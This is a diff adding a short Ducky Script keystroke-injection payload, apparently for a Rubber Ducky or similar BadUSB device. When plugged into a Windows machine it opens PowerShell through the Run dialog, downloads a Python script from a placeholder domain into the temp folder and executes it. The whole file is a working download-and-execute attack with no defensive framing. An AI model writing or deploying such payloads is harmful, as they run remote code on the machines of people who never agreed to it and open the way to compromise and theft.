@@ -1,0 +1,17 @@
+DEFAULT_DELAY 200
+
+REM Open PowerShell
+GUI r
+DELAY 300
+STRING powershell
+ENTER
+DELAY 1000
+
+REM Download the Python script to temp folder
+STRING Invoke-WebRequest -Uri "https://yourdomain.com/script.py" -OutFile "$env:TEMP\script.py"
+ENTER
+DELAY 1000
+
+REM Run the Python script (change 'python' to 'py' or full path if needed)
+STRING python "$env:TEMP\script.py"
+ENTER
